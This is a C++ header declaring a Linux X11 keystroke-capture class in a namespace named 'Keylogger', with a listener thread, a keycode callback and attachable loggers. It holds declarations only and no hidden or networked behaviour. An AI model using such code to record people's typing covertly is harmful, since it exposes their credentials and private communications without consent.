#ifndef KEYSTROKE_CAPTURER_LINUX_X11_H
#define KEYSTROKE_CAPTURER_LINUX_X11_H

#ifdef __linux__

#include "IKeystrokeCapturer.h"

#include <X11/Xlib.h>

#include <thread>
#include <vector>

namespace Keylogger {

class KeystrokeCapturerLinuxX11 : public IKeystrokeCapturer {
 public:
    bool start();
    void stop();

    void consumeKeystrokes(bool consume);
    void setCallback(std::function<void (int keycode, KeyState state)> callback);
    void addLogger(ILogger* logger);

 private:
    std::vector<ILogger*> _loggers;
    bool _consumeKeystrokes = false;
    std::function<void(int keycode, KeyState state)> _callback;

    Display* _display = nullptr;
    std::thread* _thread = nullptr;
    bool _threadRun = false;

    void _keystrokeListener();
};

}

#endif // defined(__linux__)

#endif // KEYSTROKE_CAPTURER_LINUX_X11_H
